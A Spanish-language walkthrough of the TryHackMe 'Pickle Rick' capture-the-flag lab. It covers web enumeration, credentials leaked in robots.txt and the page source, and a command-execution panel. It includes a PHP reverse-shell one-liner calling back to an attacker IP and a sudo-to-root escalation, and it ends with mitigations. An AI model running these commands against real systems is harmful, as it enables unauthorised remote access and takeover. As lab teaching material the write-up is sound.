# Pickle Rick — THM

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**Categoría:** Web / Fuzzing / Reverse Shell / Sudo

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.130.188.88
```

- Encontramos:

- `22/tcp` → SSH
- `80/tcp` → HTTP

- Accedemos a la web:

```text
http://10.130.188.88/
```

### Enumeración inicial

- Realizamos fuzzing para descubrir archivos y directorios:

```bash
ffuf -u http://10.130.188.88/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- Encontramos:

```text
/index.html
/robots.txt
```

- Revisamos `robots.txt`:

```text
http://10.130.188.88/robots.txt
```

- Encontramos una cadena que parece ser una contraseña:

```text
Wubbalubbadubdub
```

- También utilizamos `whatweb` para identificar tecnologías:

```bash
whatweb http://10.130.188.88
```

- Encontramos:

- Apache
- Bootstrap
- jQuery

- Revisamos el código fuente de la página:

```text
view-source:http://10.130.188.88/
```

- Encontramos otra cadena interesante:

```text
R1ckRul3s
```

### Prueba de SSH

- Probamos las credenciales obtenidas contra SSH:

```bash
ssh R1ckRul3s@10.130.188.88
```

- Utilizamos:

```text
Contraseña: Wubbalubbadubdub
```

- Las credenciales no funcionan para SSH, por lo que continuamos con la enumeración web.

## 2. Enumeración

### Fuzzing de archivos

- Utilizamos una wordlist y añadimos extensiones PHP y TXT:

```bash
ffuf -u http://10.130.188.88/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt
```

- Encontramos:

```text
/login.php
/denied.php
/portal.php
```

- Accedemos a:

```text
http://10.130.188.88/login.php
```

- Probamos las credenciales obtenidas anteriormente:

```text
Usuario: R1ckRul3s
Contraseña: Wubbalubbadubdub
```

- Conseguimos acceder correctamente al panel.

### Panel de comandos

- Dentro del panel encontramos una funcionalidad que permite ejecutar comandos.

- Las demás pestañas indican que necesitamos ser el verdadero Rick para poder acceder a ellas.

- Aprovechamos el panel de comandos para conseguir ejecución de comandos en el servidor.

## 3. Explotación

### Reverse Shell

- Primero comprobamos si PHP está instalado:

```bash
which php
```

```bash
php --version
```

- En nuestra máquina nos ponemos a la escucha:

```bash
nc -lvnp 8989
```

- Utilizamos el panel para ejecutar una reverse shell PHP:

```bash
php -r '$sock=fsockopen("192.168.173.148",8989);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- Recibimos la conexión en nuestra máquina.

- Comprobamos el usuario:

```bash
id
```

- Inicialmente obtenemos una shell como `www-data`.

### Mejorar la shell

- Utilizamos Python para conseguir una pseudo-terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- Configuramos el tipo de terminal:

```bash
export TERM=xterm
```

- Pulsamos:

```text
Ctrl + Z
```

- En nuestra máquina ejecutamos:

```bash
stty raw -echo
```

- Volvemos a la sesión:

```bash
fg
```

- De esta forma conseguimos una shell mucho más funcional.

### Primer ingrediente

- Enumeramos el directorio actual:

```bash
ls
```

- Encontramos:

```text
clue.txt
```

- Lo leemos:

```bash
cat clue.txt
```

- El archivo nos indica que debemos buscar el siguiente ingrediente.

- Encontramos:

```text
Sup3rS3cretPickl3Ingred.txt
```

- Leemos su contenido:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

- Obtenemos el primer ingrediente.

### Segundo ingrediente

- Nos dirigimos a `/home`:

```bash
cd /home
ls
```

- Encontramos los directorios:

```text
rick
ubuntu
```

- Entramos en el directorio de `rick`:

```bash
cd /home/rick
ls
```

- Encontramos el archivo correspondiente al segundo ingrediente y lo leemos.

### Tercer ingrediente

- Suponemos que el último ingrediente se encuentra en una ubicación protegida del sistema, por lo que comprobamos nuestros privilegios:

```bash
sudo -l
```

- Obtenemos:

```text
User www-data may run the following commands on ip-10-130-188-88:
    (ALL) NOPASSWD: ALL
```

- Esto significa que `www-data` puede ejecutar **cualquier comando como cualquier usuario mediante sudo sin introducir contraseña**.

## 4. Escalada de privilegios

### Obtener root

- Como `www-data` puede ejecutar cualquier comando con `sudo`, simplemente ejecutamos:

```bash
sudo su
```

- Comprobamos:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos sobre la máquina.

### Tercer ingrediente

- Nos dirigimos al directorio `/root`:

```bash
cd /root
ls
```

- Encontramos:

```text
3rd.txt
```

- Lo leemos:

```bash
cat 3rd.txt
```

- Obtenemos el tercer ingrediente.

## 5. Reporte

- La máquina **Pickle Rick** expone un servidor web Apache en el puerto `80` y SSH en el puerto `22`.
- Durante la enumeración encontramos `robots.txt`, donde aparece `Wubbalubbadubdub`, y en el código fuente encontramos `R1ckRul3s`.
- El acceso por SSH con estas credenciales no funciona.
- Mediante fuzzing descubrimos `login.php`, `denied.php` y `portal.php`.
- Utilizamos las credenciales encontradas para acceder al panel de `login.php`.
- El panel dispone de una funcionalidad que permite ejecutar comandos en el servidor.
- Aprovechamos esta funcionalidad para ejecutar una reverse shell PHP y obtener acceso como `www-data`.
- Mejoramos la shell utilizando Python y configuramos correctamente el terminal.
- Encontramos el primer ingrediente en `Sup3rS3cretPickl3Ingred.txt`.
- El segundo ingrediente se encuentra en el directorio `/home/rick`.
- Al ejecutar `sudo -l` descubrimos que `www-data` puede ejecutar cualquier comando como root sin contraseña.
- Utilizamos `sudo su` para convertirnos en `root`.
- Finalmente accedemos a `/root/3rd.txt` y obtenemos el tercer ingrediente.

### Cadena de ataque

```text
Nmap
 ↓
HTTP
 ↓
robots.txt / código fuente
 ↓
Credenciales
 ↓
ffuf
 ↓
login.php
 ↓
Panel de comandos
 ↓
PHP Reverse Shell
 ↓
www-data
 ↓
Enumeración
 ↓
sudo -l
 ↓
NOPASSWD: ALL
 ↓
sudo su
 ↓
root
 ↓
3 ingredientes
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| Información sensible en `robots.txt` y código fuente | Media | Revelación de credenciales |
| Panel web con ejecución de comandos | Crítica | Remote Code Execution |
| `www-data` con `sudo NOPASSWD: ALL` | Crítica | Escalada directa a root |

### Mitigaciones

- No almacenar información sensible en `robots.txt` o en el código fuente.
- Implementar autenticación y autorización correctamente en las funcionalidades administrativas.
- No permitir ejecución arbitraria de comandos desde aplicaciones web.
- Aplicar el principio de mínimo privilegio a `sudo`.
- Evitar reglas como `NOPASSWD: ALL` para usuarios de aplicaciones web.
- Restringir los permisos de `www-data`.

## 🧠 Lessons Learned

- `robots.txt` puede contener información útil para la enumeración, aunque no debería utilizarse para proteger recursos.
- El código fuente puede revelar nombres de usuarios, rutas o credenciales.
- `ffuf` permite descubrir endpoints que no aparecen directamente en la página.
- Una funcionalidad web que permite ejecutar comandos puede convertirse directamente en RCE.
- Una reverse shell permite convertir la ejecución remota de comandos en una sesión interactiva.
- `python3 -c 'import pty;pty.spawn("/bin/bash")'` ayuda a mejorar una shell limitada.
- `sudo -l` es fundamental para comprobar qué puede ejecutar un usuario con privilegios elevados.
- `NOPASSWD: ALL` permite ejecutar cualquier comando mediante `sudo` sin introducir contraseña y supone un vector crítico de escalada.
